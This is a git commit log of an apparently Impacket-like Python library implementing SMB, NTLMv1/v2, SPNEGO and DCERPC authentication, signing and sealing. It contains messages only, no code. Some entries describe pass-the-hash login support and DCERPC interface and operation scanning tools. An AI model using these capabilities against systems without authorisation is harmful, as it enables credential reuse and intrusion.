Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 30 21:49:46 2011 +0000

    isDCE instead of struct_type... more descriptive

commit 969a1d2c63364382e02f2cf370b9e2e657aba5f6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 29 15:19:16 2011 +0000

    get_server_name() now works for extended and non extended session security

commit fad6e704d83ac071ab70316df4e550329a3fd59e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 29 14:47:54 2011 +0000

    If port 445 and remote_name == '*SMBSERVER' -> remote_name = remote_host

commit 75402b57d8766e474807a78e791fb98a140c48aa
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 29 14:19:49 2011 +0000

    Updated the testcases based on previous commit changes

commit 3a595b57ba6cb288aee22402115852d3e17fcebc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 29 14:19:06 2011 +0000

    Changes to SEAL, MAC, and SIGN to adapt them to DCE Signing

commit 5899837dfe0d347ac1e0fc3e1b052a6350e54ee5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 27 19:31:24 2011 +0000

    Adjusting the data received based on previous commit. Now it does getData()

commit 382d4324d29026bb2cdf880b8755121a0ade29c6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 27 19:30:23 2011 +0000

    1. Added classes for DCERPC_NTLMMessageSignature
    2. Commented exportedSessionKey key weakening, that shouldn't be needed (I'm leaving that on until further testing)
    3. MAC() now received a parameter to construct the right structure if DCE is underway
    4. MAC() returns the structure instead of the data

commit 0c2880a76b4f911841b449a93ce4352a30e4f6cc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 25 02:28:13 2011 +0000

    Done.. all the sealing/signing tests are working now.. Time to put it working in real world

commit 7d4602c1800c5a0a48d089f52cd219daa7720d3d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 25 02:23:44 2011 +0000

    handle_seal should be used for message signing if also sealed. Yes.. confusing.. but that's what the documentation says..

commit 5d8bc3a42c3df577d88478a7237bd530ff3a14c1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 25 01:01:45 2011 +0000

    Since SEAL does SIGN as well, we should set the right keys and handlers for both situations

commit c76276300efa58eab916943b026c059723f9275b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 25 01:01:01 2011 +0000

    Still working

commit 2c350d6dfadf6f81571620a4cdd8edc5eefa09fc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 25 00:52:51 2011 +0000

    those damn magic constants must be asciiz

commit a79ab822c4441f05f6afef7faac8d72f58ac9471
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 25 00:51:23 2011 +0000

    Still working on this

commit 0efd5976665a79e63bbd71fdead0e7056bd07d14
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 24 23:23:49 2011 +0000

    keyExchangeKey should be available even if no KeyExchange is performed

commit 7685479e4479f2a47f858e07937e7bc7592f409b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 24 23:08:26 2011 +0000

    Adding the sealing/signing stuff tests. Not yet finished

commit 757093d2deac88388b13dde779de2fb80fb2c134
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 24 23:07:55 2011 +0000

    Added exportedSessionKey to KeyExchangeKey if no KEY_EXCH set. Double check this with tests

commit fbeb4b66b487f75ca33fca3b14c18d781a66b147
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 24 23:03:47 2011 +0000

    Added functions for the ongoing sealing/signing stuff:
    MAC()
    SEAL()
    SIGN()
    SIGNKEY()
    SEALKEY()

commit a1f700b7b684bf66ad78f339910551b1c175c598
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 24 22:59:07 2011 +0000

    Left some commented lines for the ongoing work of supporting signing and sealing with all the NTLM* flavors

commit 6ed442d36e5c4c0aee3c7b8c5a75f818103eb4af
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 24 22:56:26 2011 +0000

    Lowering the timeout value in case the target host dies in the middle of the connection

commit e212f513ec24c44da2fbfa81a4a5bcc96f6d450b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 24 15:40:57 2011 +0000

    1. Moved all the NTLMSSP logic into ntlm.py where they belong.
    2. Created high level functions getNTLMSSPType1 and getNTLMSSPType3 that are used by smb now (and in the future dcerpc)

commit 37eeabe4d230bca843c0f1f9e1e34fac6c963223
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 23 23:05:33 2011 +0000

    Checking of more flags in place. Next step is to take all the NTLMSSP out to ntlm where it should belong so other modules (e.g. dcerpc) can use the same code

commit ae79e43b7d846de8c67a1f1e5d467388bc5e49d4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 23 22:23:57 2011 +0000

    Adding domain to get_credentials and all the instances of login

commit fb1fc0b4e7b7b493add39dcc84d08ae260875648
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 23 21:34:36 2011 +0000

    MessageSignature structures for future use on signing and sealing

commit 5763b0c41a2a4f06ffec272ce8df7df0b42876f8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 23 20:54:38 2011 +0000

    Adding domain to set_credentials and SMBTransport

commit 8dc369897c4eaeae226e6a1818ab44ea52c5e166
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 23 20:15:28 2011 +0000

    Adding domain to set_credentials and SMBTransport

commit 65c78e6d46c8dc6fefc19b39113a036d50016db8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 23 17:31:50 2011 +0000

    Changed all instances of AF_INET for a getaddrinfo() so we can handle IPv6 addresses

commit 88f886a362518a70018719192f8f97226df32ed5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 23 14:20:18 2011 +0000

    1. Removed md5, no longer needed
    2. Added verification of the returned flags when negotiating capabilities, so the right encryption key is generated (128, 56 or 40 bit)

commit 5fa8d125620a5812314a55bb77474ff9a1e35382
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 22:17:22 2011 +0000

    0008-Add-opdump-a-tool-for-scanning-for-operations and
    0009-opdump-handle-closed-connections-properly from Catalin.
    Thanks!

commit f6e953b9414452624435c2f3d89c94911d084cc4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 22:15:20 2011 +0000

    0007-Add-ifmap-a-tool-for-scanning-for-listening-DCERPC from Catalin

commit 84b0e4aa38d66ac55635ad34698835de0146c731
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 21:56:24 2011 +0000

    0006-Implement-Remote-Management-Interface-in-particular from Catalin

commit 4aff752ffb544b91087625f3647625a15db3ac47
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 21:52:31 2011 +0000

    0004-Make-an-Exception-subclass-specific-to-dcerpc-for-ex and
    0005-Fix-parsing-of-the-BindAck-response-and-check-result from Catalin

commit dbb6ee5415ee1999cea0eb1b19dcb5af0f5545cf
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 21:36:20 2011 +0000

    Accidentally committed this. Reverting back. Still pending solving the issue of establishing a good connection against newer OSes where *SMBSERVER doesn't work anymore. In any case, I don't think this is the right place to patch tihs.

commit 5f5f170fe35c02aa6d0b6b27d1408419c5e82897
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 21:15:43 2011 +0000

    0003-Add-some-more-UUID-parsing-formatting-helpers from Catalin

commit f4c271a9616ee6aff88b0dc0d7b255f9419f6199
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 21:12:25 2011 +0000

    0002-Move-KNOWN_UUIDS-to-module-scope-so-other-modules-ca from Catalin

commit fe139b2ef4d323e9ddc9c3134ce2b769e92aedbc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 21:07:04 2011 +0000

    0001-Fix-some-typos-in-the-KNOWN_UUIDS-list.patch from Catalin

commit 8e3c1cf68bdd5c53c61b4e80c44e1d1205eac1b5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 20:13:00 2011 +0000

    1. Share's comments (remarks) were not aligned with the sharename

commit 4935f064c9862c5b62e3868ec9394b1498d1f5b5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 19:40:05 2011 +0000

    ntlm USE_NTLMv2 back to True
    2. neg_session must use self._dialects_parameters['Capabilities'] to decide extended security

commit e5ffe53c4f5b10af9b31569908fe3bd293fd0e7d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 18:53:01 2011 +0000

    Clarifications to run the tests right

commit 1feb7e9c15f1867fd68351f70522406e373dd191
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 18:50:49 2011 +0000

    Signature related stuff.
    Added the aTime to the av_pairs if not received by the server (old Windows)

commit 25a4110d0229fab8e6d6c0649352716f9184ac5c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 14:36:00 2011 +0000

    Support for SPN name validation added

commit 3a83810cf7072eb3064bfff699aa937bc33864a8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 14:16:07 2011 +0000

    Now the library signs SMB if it is ENFORCED by the server (Local Security Policy -> Local Policies -> Security Options -> Digitally sign communications (always))

commit cceb77a570548c175e31b29c224b783285b1c9ea
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 14:11:11 2011 +0000

    Fixed setting the right values for the computeReponse* response

commit 6d2611f2aea73f3889a9df01cc49b403fa7de57a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 13:36:49 2011 +0000

    This was the problem why NTLM2 wasn't working. Now all the auth methods work

commit cfc32b8a328e04eb08495d9509713c98d8c3aca1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 12:33:38 2011 +0000

    Changed the arguments for computeResponse* based on the changed previously made

commit 49b24eac42d3fc5d479050e798a52388e5aff191
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 01:51:04 2011 +0000

    SMB Signature is working.. verified. I'll keep it disabled tho.

commit 6c6e96f623e412f6953cf12026ccaf58aaf59517
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 22 01:18:33 2011 +0000

    1. Ok.. almost done with the NTLM saga. Depending on the USE_NTLMv2 global variable, when calling computeResponse, it will either go to NTLMv1 or NTLMv2 (and calculate the different values depending on the flags set, eg: NTLM2). There's an special case when authentication doesn't work against a Win7 and it is when using NTLMv1 with extended security, I guess that has to do with the fact that the other side is expecting NTLMv2 instead of NTLM2. Further research is necesary (if someone knows this let me know).
    2. SMB signing is now working but disabled. It will be enabled in the future only if the target requires it (win 2008)

commit b8549c9a6330e6dbd02cc4c50e1afa0185d93005
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 21 23:20:16 2011 +0000

    Fixed minor things.

commit ced6159a7055ca68a093591a7a42dee724a60be2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 21 22:45:34 2011 +0000

    1. Checked everything with the MS-NLMP examples. Just one (4.2.2.2.2 with LM_KEY) to fix (not a big deal actually)
    2. Added the USE_NTLMv2 global variable to ntlm.py since that's not something to be negotiated by the client/server
    3. computeResponseNTLMv2 changed to computeResponseNTLM2 (better name, reflecting what's going on actually).
    4. Commented out a lot of things on NTLMAuthChallengeResponse.fromString(). I don't think we need it, but left there just in case (too much for today)

commit 633c27fd6d7de150b381929a2b919a6237870c77
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 21 22:38:34 2011 +0000

    added serverName with the AVPAIRS in there

commit a9a26927311e9c8f471348e0de01cb4e0aea0167
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 21 22:36:27 2011 +0000

    Test case based on MS-NLMP, section 4 - Protocol Examples

commit 5dd17c26469761865b318ace90e310ff491de8a0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 20 22:49:17 2011 +0000

    Just commented the signature check. SingSMB is correct, the problem seems to be when generating the encryptedRandomSessionKey. Maybe KXKEY is not doing things right. Gotta research more

commit 3e2c341125f177e39b3cfb6909b0f66c65d587f1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 20 21:58:07 2011 +0000

    1. Added more stuff for SMB signing. Still not activated since it's not yet working

commit 4e5c71b6ff81bab243b7bf209a7293ab5d23afd3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jun 19 22:07:56 2011 +0000

    1. *_Data structures base class must be Structure (it was working anyways, just for the fact of putting things right)
    2. rename() and mkdir() now uses Structure. Added classes for those and changed functions

commit f8ed3e7fec1dd144be99ca1bc43f7fd89501be10
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jun 19 21:26:49 2011 +0000

    LogOffAndX now with structure

commit 56b827e6f6be16a24bac7237b22d9d58d51c86b2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jun 19 21:14:03 2011 +0000

    Removed unused function __decode_smb

commit 258624b87c93504e8c962b07d9847d1adbe4198c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jun 19 21:06:15 2011 +0000

    1. Removed TRANSHeader class, replaced with structure
    2. Removed use of TRANSHeader in dcerpc/transport, replaced with SMBTransactionResponse_Parameters structure
    3. Created SMBTransaction* structures in smb.py
    4. Changed TransactNamedPipe to use the new structs

commit ef72ba9a2a82ba580cd1200520c4415e7f4a31d4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jun 19 01:43:40 2011 +0000

    1. Implemented SMB_COM_TRANSACTION using structure
    2. Changed send_trans to do so
    3. Removed __trans. Old and useless
    4. Removed __browse_servers, browse_domains and browse_servers_for_domain. Those methods didn't work, and, besides, should be implemented in SRVSVC (setting a ODO there)

commit 68fcb42731637069c641de1244cb98a63166361d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jun 19 00:28:20 2011 +0000

    SMB_COM_CLOSE with structure now

commit e067cae466bec2ab0e9126254f4c11528f9b4c8c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jun 19 00:09:23 2011 +0000

    stor_file now uses write_andx with structure. Still left stor_file_raw

commit a774d94fc22a13a912a84c3d16cb482ac0ae4a07
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 18 22:39:52 2011 +0000

    One NT Error added

commit 0fd5072ec1671f8cbd7287c7baa2141e152cf644
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 18 22:36:30 2011 +0000

    Variable initialization missed

commit d45e7a5fcddc308e092a5c1a24ea3cf3a0b340ae
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 18 22:27:14 2011 +0000

    1. Removed NTLMDialect class. Now replaced by _ntlm_dialect_parameters and _ntlm_dialect_data (all with structure)
    2. Changed all references of _ntlm_dialect to the proper new schema
    3. Added parsing of ServerName and DomainName in SMBDialectData. Extra careful data might not be there (e.g. some Unix systems)
    4. Updated the get_server_time method now using _ntlm_dialect_parameters

commit e45987be77ad5c44677205b92e9a4e5c90295b9b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 18 18:22:02 2011 +0000

    removed set_key_odd_parity. Not used at all

commit 5c711c2e20d337feb25ac5f196de07f38fa45ff2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 18 18:16:00 2011 +0000

    Some beautifying of the source code.

commit 840cbd614195d3ed53ce7a91b96d2816524e0828
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 18 17:02:31 2011 +0000

    If hashes were passed to a dcerpc transport, now pass the hash is going to be performed as well (only in NTLMv1 as this is the only auth supported by dcerpc)

commit b06f86f6ec492fc59acdc3fa8cdc93a8da857053
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 18 00:54:10 2011 +0000

    Fixed correctly handling NULL sessions in extended mode

commit 32799720ab604db2a86d5428fcbc276f0f38b135
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 18 00:38:13 2011 +0000

    Fixed correctly handling NULL sessions in login_standard

commit a503056226a222db1a7d8eee40892a7d4d9238c9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 17 22:55:44 2011 +0000

    1. Removed the SMBExtended class. That shouldn't have ever been there.

commit 2a72b1bb7056626cdfba62c1f631f502546d5b3a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 17 22:50:41 2011 +0000

    1. Removed login_pass_the_hash and login_plaintext_password functions. No longer needed
    2. Turned on by default extended_security. Now the library tries by default to connect to the targets using extended security and NTLMv2.

commit a5ff88db15debdb2c3668192710f5f2c601d721a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 17 22:48:07 2011 +0000

    1. Added some NT Errors since we get those ones when using extended security
    2. self._dialect_data to be the default in the future, still most of the code using self._ntlm_dialect
    3. Remove an assert since now we do NTLMv2
    4. Session key generation for NTLMv1 now in place
    5. Reorganized code in login_extended
    6. login() now goes to either login_standard or login_extended, and passes the hash right away to both functions.

commit b50d20cdfe81306623e3377103545506c636b4e4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 17 22:42:19 2011 +0000

    1. NTLMv1 (simplified) algorithm written. It actually calls some of the previous functions.
    2. Minor changes to functions names

commit 18c6bac732bfbc141f6759db15783d3a313ce717
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 17 19:59:19 2011 +0000

    1. Changed NewSMBPacket structure so it now has the SecurityFeatures (signing) field (in preparation for SMB signing)
    2. Added SMB_SIGNING constants
    3. Added singSMB(), does nothing now

commit efed798f2058074eb638d6c79efe8ae9dc789221
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 17 19:54:57 2011 +0000

    1. Making pass the hash work with NTLMv2 - done

commit afe54eff4dae3c2d3a1dca34257612d4487febe4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 17 17:08:26 2011 +0000

    1. Now the client requests KEY EXCHANGE and INFO TARGET (the later needed for NTLMv2)
    2. Added the logic to call the KEY EXCHANGE functions previously committed to ntlm.py

commit b21111af0fa0f3b89f56e49d469e071a39615ec0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 17 17:06:54 2011 +0000

    1. NTLMAuthChallenge now correctly handles servers that don't send Version Information
    2. NTLMSSP_KEY_EXCHANGE now supported. Key is calculated and send to the target Server
    3. Generate a FILETIME structure if the server doesn't send one, to complete NTLMv2 auth.

commit c9dbcb85617853952cbef5456874686bf43aade8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 17 02:22:05 2011 +0000

    1. Completed the NTLMv2 support when extended security is used. Still not default.

commit ca6e0be0a36a4a0999bd5586fcbc1e9a96f8b4ab
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 17 02:15:43 2011 +0000

    1. Minor fixes on AV_PAIR so unpack/pack works well
    2. Fixed the NTLMv2 algorithm, now it works.

commit 861befa380623e13ebe7ebb2e11293c74f2d6f66
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 16 23:14:33 2011 +0000

    Added handling of NTLMv2 (still not working) when treating extended_security

commit 127dfa5ea29c06c3218237e6e5eb9368c0adcd4b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 16 23:12:22 2011 +0000

    Extra verifications just in case there's no TargetInfoFields in the packet

commit cab17fe14299108b156cc5be2cac6de5b15c17b9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 16 23:09:20 2011 +0000

    1. Added AV_PARIS structure
    2. Added handling of AV_PAIRS to NTLMAuthHeader
    3. Added NTLMv2 algorithm (still not working)

commit a072ed355cd3e08b18651a609706d8fad0192afa
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 16 19:19:49 2011 +0000

    Completed the NTLMAuthChallenge structure. We need some items there to do NTLMv2

commit 6e06bed8f7cf8c1e0aa43184ac23d3eb6581fb76
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 15 22:26:10 2011 +0000

    Defined TypesMech to map string names to UUIDs

commit c07fa29622702e85e44fdf6777aadd5a4f4557bc
Author: gera@corest.com <gera@corest.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 15 17:39:50 2011 +0000

    binascii.crc32() can return negative numbers, they must be properly packed as integer (not unsigned integer)
    
    also changed to integer (instead of long) so in 64 bits platforms they are still packed as 32 bits

commit 10c548427896cf75765b715d957ed838e69c9324
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 15 02:17:00 2011 +0000

    1. Fixed the INVALID_PARAMETER issue.. the Uid was missing from the previous packet. All done.. but still disabled until further testing is done.

commit 5faa5c8864d6fa09e87f52c24fc793045ba86326
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 15 01:20:02 2011 +0000

    1. Implemented SPNEGO_NegTokenResp()
    2. Fixed bug on SMBSessionSetupAndX_Extended_Data SecurityBlobLength calculation
    3. Added SMBSessionSetupAndX_Extended_Response structures
    
    Still all the new stuff is disabled. Pending figuring out why the server is responding with INVALID_PARAMETER when sending the last NegTokenResp. Could be a flags problem.

commit 5ecff4660a1eb2ce7c114ca6d73b476dcb4ab5eb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 14 21:47:47 2011 +0000

    1. Added SMB FLAGS and FLAGS2
    2. Changed existing ones (LONG_FILENAME and USE_NT_ERRORS) to (LONG_NAMES and NT_STATUS) per specification's document

commit cb6cac766a59ab16627aa11d468ccadee83d57b0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 14 20:51:48 2011 +0000

    More stuff on extended security:
    
    1) Completed the NegTokenInit with the mechToken
    2) Started working on the login_extended, one packet more to go

commit 210fc6633f6efabb8d8c06b5002e56ad42864aea
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 14 14:38:17 2011 +0000

    In preparation for Extended Security authentication support:
    1) Added GSS-API structures and functions
    2) Added SPNEGO structures, now it supports NegTokenInit

commit 355df3118e1456e97a6df3dabc70a321f60fd94b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jun 12 22:11:06 2011 +0000

    In preparation for Extended Security authentication support:
    1) Added Extended Security structures
    2) neg_session can be set to request Extended Security
    3) Non extended security structures created and parsed, although NTLMDialect is still used overall (to maintain compatibility)
    4) login_extended defined, but yet implemented (it shouldn't reach that code ever)

commit cf1da46024be44937939551469f7d475ccdef47c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jun 12 00:36:19 2011 +0000

    Flags doesn't exist, it's Flags1

commit dd7c6862d2062e57d7a569823976fe3686ac2d4d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jun 12 00:27:38 2011 +0000

    SMB neg_session now uses NewSMBPacket

commit 900977fba358a311abc285d5f8d8e03def493604
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 11 23:39:34 2011 +0000

    Added info command to display results for NetrServerGetInfo

commit e0ffd4153127fa5b495cde48b3f0089850c50ed8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 11 23:31:48 2011 +0000

    Added support for NetrServerGetInfo(Level2)

commit 72887f78b45c52af3ce0b539fc5ffd075b4741bd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 11 22:33:16 2011 +0000

    List of shares now uses srvsvc

commit 0f776b019359dfcde29617800d372e8ffc8cdeed
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 11 22:28:54 2011 +0000

    Added the ability to specify an already connected SMB session to the transport avoiding creating an extra connection

commit ae61854b6ca0b974908b6f37acb6efb352335c7f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 11 22:16:06 2011 +0000

    Copyright change

commit 32e61e8b683dba375703e1cc4663f46d35ed14f4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 11 22:07:52 2011 +0000

    Added get_remote_host method

commit 980dd754cfa1e4577366b4f73e2ddb70a321de31
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 11 21:53:52 2011 +0000

    Added support to specify the remote_name via the open command (from Vista on, *SMBSERVER doesn't work anymore)

commit 38e79050a88e3fc7fe147cdece674d2de29459cc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
